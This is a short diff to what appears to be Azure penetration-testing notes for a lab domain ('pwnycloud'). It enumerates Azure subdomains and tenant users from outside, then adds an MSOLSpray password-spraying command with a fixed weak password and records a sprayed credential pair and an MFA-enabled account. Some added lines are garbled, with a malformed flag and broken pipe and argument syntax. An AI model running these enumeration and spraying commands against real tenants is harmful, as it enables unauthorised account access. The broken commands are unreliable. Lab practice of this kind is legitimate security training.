@@ -8,4 +8,12 @@ Import-Module 'MicroBurst-master\MicroBurst.psm1'
 
 Invoke-EnumerateAzureSubDomains -Base pwnycloud -Verbose
 
-Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal
+Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -vn Method Normal
+
+Import-Module .\MSOLSpray-master\MSOLSpray.ps1
+Invoke-MSOLSpray -UserList |users.txt
+-Password "W3@kPasswd!"
+
+portal.azure.com
+pwd.spray@pwny.cloud : W3@kPasswd!
+mfa.enabled@pwny.cloud
